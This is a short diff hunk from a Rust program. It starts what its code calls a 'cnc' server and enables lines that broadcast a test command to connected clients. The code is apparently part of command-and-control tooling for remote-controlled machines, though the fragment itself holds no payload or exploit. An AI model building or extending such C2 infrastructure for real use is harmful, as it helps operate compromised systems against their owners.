@@ -21,11 +21,11 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     server::start_cnc_server(IP, PORT, &server).await?;
     signal::ctrl_c().await?;
 
-    // let my_server = Arc::clone(&server);
-    // let mut lock = my_server.lock().await;
-    // lock.broadcast_command(b"test".to_vec()).await.unwrap();
-    // std::mem::drop(lock);
-    // signal::ctrl_c().await?;
+    let my_server = Arc::clone(&server);
+    let mut lock = my_server.lock().await;
+    lock.broadcast_command(b"test".to_vec()).await.unwrap();
+    std::mem::drop(lock);
+    signal::ctrl_c().await?;
     Ok(())
 }
 
